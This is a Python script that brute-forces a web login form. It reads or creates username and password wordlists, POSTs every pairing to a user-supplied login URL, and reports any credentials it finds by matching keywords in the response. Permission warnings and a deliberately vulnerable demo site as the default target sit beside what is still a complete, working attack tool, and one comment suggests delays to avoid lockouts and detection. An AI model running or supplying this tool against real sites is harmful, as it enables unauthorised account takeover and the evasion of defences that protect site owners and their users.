import requests
import os
import time

# --- Configuration ---
# IMPORTANT: Use a known vulnerable test application or a controlled environment.
# DO NOT use this script against live, production websites without explicit permission.
DEFAULT_LOGIN_URL = "http://testphp.vulnweb.com/login.php" # Example vulnerable login URL
DEFAULT_USERNAME_FIELD = "uname" # Name of the username input field in the HTML form
DEFAULT_PASSWORD_FIELD = "pass"  # Name of the password input field in the HTML form
DEFAULT_USERNAME_WORDLIST = "usernames.txt" # Default wordlist file name
DEFAULT_PASSWORD_WORDLIST = "passwords.txt" # Default wordlist file name

# Strings to look for in the response to indicate a successful login (case-insensitive)
# This is highly dependent on the target application.
SUCCESS_INDICATORS = [
    "welcome",
    "logout",
    "dashboard",
    "my account",
    "successful login",
]

# Strings to look for in the response to indicate a failed login (case-insensitive)
FAILED_INDICATORS = [
    "invalid username",
    "invalid password",
    "login failed",
    "incorrect credentials",
]

# --- Helper Function to Create Dummy Wordlists ---
def create_dummy_wordlists():
    """
    Creates dummy wordlist files for testing if they don't already exist.
    """
    if not os.path.exists(DEFAULT_USERNAME_WORDLIST):
        with open(DEFAULT_USERNAME_WORDLIST, 'w') as f:
            f.write("admin\n")
            f.write("user\n")
            f.write("test\n")
            f.write("guest\n")
        print(f"Created a dummy username wordlist: {DEFAULT_USERNAME_WORDLIST}")

    if not os.path.exists(DEFAULT_PASSWORD_WORDLIST):
        with open(DEFAULT_PASSWORD_WORDLIST, 'w') as f:
            f.write("password\n")
            f.write("123456\n")
            f.write("admin\n")
            f.write("test\n")
            f.write("qwerty\n")
        print(f"Created a dummy password wordlist: {DEFAULT_PASSWORD_WORDLIST}")

# --- Main Login Brute-Forcer Function ---
def run_login_bruteforcer():
    """
    Prompts the user for login details and attempts to brute-force the login form
    using provided wordlists.
    """
    print("--- Basic Login Brute-Forcer ---")
    print(f"Default login URL: {DEFAULT_LOGIN_URL}")
    print(f"Default username field: {DEFAULT_USERNAME_FIELD}")
    print(f"Default password field: {DEFAULT_PASSWORD_FIELD}\n")
    print("WARNING: Only use this script on targets you have explicit permission to test.")
    print("This script can generate a lot of traffic and may trigger lockout mechanisms.")
    print("Use responsibly and consider delays between attempts if needed.\n")

    login_url = input(f"Enter login URL (e.g., {DEFAULT_LOGIN_URL}): ").strip()
    if not login_url:
        login_url = DEFAULT_LOGIN_URL

    username_field = input(f"Enter username form field name (e.g., {DEFAULT_USERNAME_FIELD}): ").strip()
    if not username_field:
        username_field = DEFAULT_USERNAME_FIELD

    password_field = input(f"Enter password form field name (e.g., {DEFAULT_PASSWORD_FIELD}): ").strip()
    if not password_field:
        password_field = DEFAULT_PASSWORD_FIELD

    use_default_wordlists = input("Use default built-in wordlists? (yes/no): ").strip().lower()

    if use_default_wordlists == 'yes':
        create_dummy_wordlists() # Ensure dummy wordlists exist
        username_wordlist_path = DEFAULT_USERNAME_WORDLIST
        password_wordlist_path = DEFAULT_PASSWORD_WORDLIST
        print(f"Using default wordlists: '{username_wordlist_path}' and '{password_wordlist_path}'")
    else:
        username_wordlist_path = input("Enter custom username wordlist path: ").strip()
        if not username_wordlist_path:
            print("Username wordlist path cannot be empty. Exiting.")
            return

        password_wordlist_path = input("Enter custom password wordlist path: ").strip()
        if not password_wordlist_path:
            print("Password wordlist path cannot be empty. Exiting.")
            return

        # Check if custom wordlists exist
        if not os.path.exists(username_wordlist_path):
            print(f"Error: Custom username wordlist '{username_wordlist_path}' not found. Exiting.")
            return
        if not os.path.exists(password_wordlist_path):
            print(f"Error: Custom password wordlist '{password_wordlist_path}' not found. Exiting.")
            return
        print(f"Using custom wordlists: '{username_wordlist_path}' and '{password_wordlist_path}'")


    print(f"\nStarting login brute-force on {login_url}...")

    try:
        with open(username_wordlist_path, 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
        with open(password_wordlist_path, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]

        total_attempts = 0
        found_credentials = []

        # Create a session object to handle cookies
        session = requests.Session()

        for username in usernames:
            for password in passwords:
                total_attempts += 1
                
                # Prepare the data payload for the POST request
                login_data = {
                    username_field: username,
                    password_field: password
                }

                print(f"  Attempt {total_attempts}: Trying {username}:{password}")

                try:
                    # Send the POST request to the login URL
                    response = session.post(login_url, data=login_data, timeout=10) # 10-second timeout
                    
                    response_text = response.text.lower()
                    
                    # Check for success indicators
                    is_success = False
                    for indicator in SUCCESS_INDICATORS:
                        if indicator.lower() in response_text:
                            is_success = True
                            break
                    
                    # Check for failed indicators (useful for identifying if the attempt was processed)
                    is_failed = False
                    for indicator in FAILED_INDICATORS:
                        if indicator.lower() in response_text:
                            is_failed = True
                            break

                    if is_success:
                        print(f"    [+] SUCCESS! Valid credentials found: {username}:{password}")
                        found_credentials.append(f"{username}:{password}")
                        # In a real scenario, you might break here or continue to find more
                        return # Found credentials, exiting for this basic script
                    elif is_failed:
                        # Print a more concise message for failed attempts to keep output clean
                        # print(f"    [-] Failed: {username}:{password}")
                        pass
                    else:
                        # If neither success nor explicit failure indicators are found,
                        # the response might be ambiguous or different.
                        # This could indicate a successful login if the page content changes significantly.
                        # For a basic script, we'll assume no explicit success means failure unless
                        # further analysis (e.g., comparing response length/content to a known failed login) is done.
                        pass

                except requests.exceptions.ConnectionError as e:
                    print(f"  [!] Connection error to {login_url} for {username}:{password}. Error: {e}. Continuing...")
                    # Do NOT return here. Continue to the next attempt.
                except requests.exceptions.Timeout:
                    print(f"  [!] Timeout trying {username}:{password}. Continuing...")
                    # Do NOT return here. Continue to the next attempt.
                except requests.exceptions.RequestException as e:
                    print(f"  [!] An unexpected request error occurred for {username}:{password}: {e}. Continuing...")
                    # Do NOT return here. Continue to the next attempt.
                
                # Optional: Add a small delay to avoid triggering lockout mechanisms or being detected
                # time.sleep(0.1) # Sleep for 100 milliseconds

    except Exception as e:
        print(f"An unexpected error occurred during wordlist processing or setup: {e}")

    print("\n--- Brute-Force Scan Summary ---")
    print(f"Total login attempts: {total_attempts}")
    if found_credentials:
        print(f"Found {len(found_credentials)} valid credential pair(s):")
        for cred in found_credentials:
            print(f"- {cred}")
    else:
        print("No valid credentials found with the provided wordlists.")
    print("Consider using different wordlists, checking for rate limiting, or analyzing responses more deeply.")

# Entry point for the script
if __name__ == "__main__":
    run_login_bruteforcer()
